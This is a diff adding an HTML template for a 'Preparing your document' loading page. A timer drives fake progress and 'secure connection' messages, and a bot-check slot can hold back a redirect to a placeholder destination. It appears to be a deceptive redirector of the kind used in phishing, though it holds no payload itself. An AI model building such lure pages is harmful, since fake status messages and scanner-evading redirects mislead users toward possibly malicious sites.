@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading…</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#fafafa;--card:#fff;--text:#161616;--muted:#6f6f6f;--line:#ececec;--accent:#111}
+@media (prefers-color-scheme:dark){:root{--bg:#0b0b0d;--card:#141417;--text:#f2f2f3;--muted:#8f8f98;--line:#26262b;--accent:#f2f2f3}}
+body{font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:var(--bg);color:var(--text);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:24px}
+.panel{width:480px;max-width:100%;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px;box-shadow:0 10px 40px rgba(0,0,0,.06)}
+.top{display:flex;justify-content:space-between;align-items:center;margin-bottom:20px}
+.file{display:flex;align-items:center;gap:14px}
+.icon{width:46px;height:46px;border-radius:12px;background:color-mix(in srgb,var(--accent) 8%,transparent);display:flex;justify-content:center;align-items:center}
+.icon svg{width:22px;height:22px;fill:none;stroke:var(--accent);stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round}
+.name{font-size:17px;font-weight:600}
+.meta{font-size:13px;color:var(--muted);margin-top:3px}
+.percent{font-size:15px;font-weight:600;font-variant-numeric:tabular-nums}
+.bar{width:100%;height:4px;background:var(--line);border-radius:50px;overflow:hidden}
+.fill{height:100%;width:0;background:var(--accent)}
+.status{margin-top:16px;font-size:14px;color:var(--muted);display:flex;justify-content:space-between;align-items:center}
+.dot{width:8px;height:8px;border-radius:50%;background:var(--accent);animation:pulse 1s infinite}
+.ts{margin-top:18px}
+@keyframes pulse{0%,100%{opacity:.25}50%{opacity:1}}
+</style>
+</head>
+<body>
+<div class="panel">
+  <div class="top">
+    <div class="file">
+      <div class="icon"><svg viewBox="0 0 24 24"><path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z"/><path d="M14 3v5h5"/></svg></div>
+      <div>
+        <div class="name">Preparing your document</div>
+        <div class="meta">Securing connection</div>
+      </div>
+    </div>
+    <div class="percent" id="percent">0%</div>
+  </div>
+  <div class="bar"><div class="fill" id="fill"></div></div>
+  <div class="status"><span id="status">Initializing…</span><span class="dot"></span></div>
+  <div class="ts"><div id="__ts_slot__"></div></div>
+</div>
+<script>
+var DEST = "__DESTINATION__", DELAY = __DELAY__;
+function __finish(){ if(window.__tsPending) return; if(DEST) window.location.replace(DEST); }
+window.__tsGo = __finish;
+
+var percent = document.getElementById("percent"), fill = document.getElementById("fill"), status = document.getElementById("status");
+var messages = ["Initializing…","Establishing secure connection…","Preparing document…","Loading preview…","Redirecting…"];
+var total = DELAY * 1000, step = 30, p = 0;
+var t = setInterval(function(){
+  p += 100 / (total/step);
+  if(p > 100) p = 100;
+  percent.textContent = Math.round(p) + "%";
+  fill.style.width = p + "%";
+  status.textContent = messages[Math.min(messages.length-1, Math.floor(p/20))];
+  if(p >= 100){ clearInterval(t); __finish(); }
+}, step);
+setTimeout(function(){ if(window.__tsPending){ window.__tsPending=false; __finish(); } }, (DELAY+4)*1000);
+</script>
+</body>
+</html>
